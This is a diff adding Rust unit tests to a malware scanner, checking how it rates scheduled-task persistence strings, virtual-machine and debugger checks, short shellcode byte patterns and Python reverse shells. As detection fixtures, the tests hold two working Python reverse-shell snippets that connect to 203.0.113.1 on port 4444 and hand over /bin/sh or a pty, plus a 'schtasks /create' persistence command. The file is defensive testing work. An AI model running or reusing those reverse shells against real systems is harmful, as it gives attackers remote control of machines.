@@ -934,3 +934,111 @@ fn long_text_before_a_binary_part_is_not_a_text_file() {
     let analysis = analyze_threats(&create_test_file_with_content(&b)).unwrap();
     assert_ne!(analysis.threat_level, ThreatLevel::Clean);
 }
+
+// ---- round 7: thin matches in large system files, padding beside a lone string,
+// ---- and the Python reverse shell
+
+fn weak_rules_of(content: &[u8]) -> (ThreatLevel, Vec<String>) {
+    let analysis = analyze_threats(&create_test_file_with_content(content)).unwrap();
+    let weak = analysis
+        .matches
+        .iter()
+        .filter(|m| m.metadata.get("evidence_strength").map(String::as_str) == Some("weak"))
+        .map(|m| m.rule_identifier.clone())
+        .collect();
+    (analysis.threat_level, weak)
+}
+
+#[test]
+fn the_word_schtasks_alone_is_not_persistence_but_a_created_task_is() {
+    let (level, classes, rules) = level_of(b"\0usage: schtasks list, schtasks query\0");
+    assert!(
+        !rules.iter().any(|r| r == "persistence_mechanisms"),
+        "{rules:?}"
+    );
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+    // Both sides: the creating command line, and the word beside a Run key.
+    let (level, _, rules) = level_of(b"\0schtasks /create /tn x /tr y\0");
+    assert!(rules.iter().any(|r| r == "persistence_mechanisms"));
+    assert!(level >= ThreatLevel::Suspicious);
+    let (level, _, _) =
+        level_of(b"\0schtasks\0Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
+    assert!(level >= ThreatLevel::Suspicious);
+}
+
+#[test]
+fn hypervisor_names_alone_are_weak_but_a_dmi_read_or_debugger_check_is_not() {
+    let (level, weak) = weak_rules_of(b"\0VMware\0QEMU\0");
+    assert_eq!(weak, ["anti_analysis"]);
+    assert_eq!(level, ThreatLevel::Clean);
+    let (level, weak) = weak_rules_of(b"\0VMware\0QEMU\0/sys/class/dmi/id/product_name\0");
+    assert!(weak.is_empty(), "{weak:?}");
+    assert!(level >= ThreatLevel::Suspicious);
+    let (level, weak) = weak_rules_of(b"\0IsDebuggerPresent\0OutputDebugString\0");
+    assert!(weak.is_empty());
+    assert!(level >= ThreatLevel::Suspicious);
+}
+
+#[test]
+fn the_two_short_shellcode_patterns_count_in_a_small_file_only() {
+    let pair = [
+        &[0xE8u8, 0, 0, 0, 0, 0x5B][..],
+        &[0x55, 0x66, 0x77, 0x88][..],
+        &[0x64, 0xA1, 0, 0, 0, 0][..],
+    ]
+    .concat();
+    let (level, weak) = weak_rules_of(&pair);
+    assert!(weak.is_empty(), "{weak:?}");
+    assert!(level >= ThreatLevel::Suspicious);
+    // The same two patterns far apart in a large binary say nothing.
+    let mut big = vec![0xCCu8; 600 * 1024];
+    big[1000..1006].copy_from_slice(&pair[..6]);
+    big[500_000..500_006].copy_from_slice(&pair[pair.len() - 6..]);
+    let (level, weak) = weak_rules_of(&big);
+    assert_eq!(weak, ["shellcode_patterns"]);
+    assert_eq!(level, ThreatLevel::Clean);
+}
+
+#[test]
+fn a_padding_run_beside_a_lone_get_pc_is_weak() {
+    let mut blob = vec![0x90u8; 48];
+    blob.extend_from_slice(&[0x55, 0x89, 0xE5, 0xE8, 0, 0, 0, 0, 0x5B, 0xC3]);
+    let (level, weak) = weak_rules_of(&blob);
+    assert_eq!(weak, ["shellcode_patterns"]);
+    assert_eq!(level, ThreatLevel::Clean);
+}
+
+#[test]
+fn a_python_reverse_shell_is_a_backdoor_and_ordinary_python_is_not() {
+    let shell = b"import socket, subprocess, os\ns = socket.socket()\ns.connect((\"203.0.113.1\", 4444))\n\
+os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubprocess.call([\"/bin/sh\", \"-i\"])\n";
+    let (level, classes, _) = level_of(shell);
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Backdoor));
+    let pty = b"import pty, os, socket\ns = socket.socket()\ns.connect((\"203.0.113.1\", 4444))\nos.dup2(s.fileno(), 0)\npty.spawn(\"bash\")\n";
+    assert!(level_of(pty).0 >= ThreatLevel::Suspicious);
+    // Ordinary Python redirects descriptors or starts a shell, not both.
+    let (level, classes, _) =
+        level_of(b"import os\nos.dup2(log.fileno(), 1)\nos.dup2(log.fileno(), 2)\n");
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+    let (level, _, _) =
+        level_of(b"import subprocess\nsubprocess.call([\"/bin/sh\", \"-c\", \"ls\"])\n");
+    assert_eq!(level, ThreatLevel::Clean);
+    // A daemonizing helper has os.dup2( and /bin/sh but no socket connect.
+    let (level, classes, _) = level_of(
+        b"import os, subprocess\nos.dup2(log.fileno(), 1)\nsubprocess.run([\"/bin/sh\", \"-c\", cmd])\n",
+    );
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+}
+
+#[test]
+fn documentation_about_reverse_shells_stays_weak_beside_shell_strings() {
+    let (level, classes, _) = level_of(
+        b"A reverse shell connects back to the operator. The shell started is /bin/sh.\nIt may call os.dup2( or pty.spawn( on the way.\n",
+    );
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+}
